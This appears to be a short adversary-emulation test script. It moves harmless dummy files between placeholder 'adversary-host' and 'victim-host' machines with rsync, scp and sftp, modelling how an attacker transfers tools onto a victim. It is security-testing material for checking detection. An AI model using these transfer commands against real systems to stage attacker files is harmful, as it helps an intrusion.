      ### FIX: Not sure how to handle commands that need to be run on multiple systems

      # Adversary System Configuration
      # Ensure SSH access has been configured for an adversary account
      echo "This file transferred by scp" > /tmp/adversary-scp
      echo "This file transferred by sftp" > /tmp/adversary-sftp
      mkdir /tmp/adversary-rsync
      cd /tmp/adversary-rsync
      touch a b c d e f g

      # Victim System Configuration
      # Ensure SSH access has been configured for a victim account
      # Ensure write access for victim account to this directory
      mkdir /tmp/victim-files
      cd /tmp/victim-files

      # Push files to victim using rsync
      rsync -r /tmp/adversary-rsync/ victim@victim-host:/tmp/victim-files/

      # Pull files from adversary using rsync
      rsync -r adversary@adversary-host:/tmp/adversary-rsync/ /tmp/victim-files/

      # Push files to victim using scp
      scp /tmp/adversary-scp victim@victim-host:/tmp/victim-files/

      # Pull file from adversary using scp
      scp adversary@adversary-host:/tmp/adversary-scp /tmp/victim-files/scp-file

      # Push files to victim using sftp
      sftp victim@victim-host:/tmp/victim-files/ <<< $'put /tmp/adversary-sftp'

      # Pull file from adversary using sftp
      sftp adversary@adversary-host:/tmp/adversary-sftp /tmp/victim-files/sftp-file
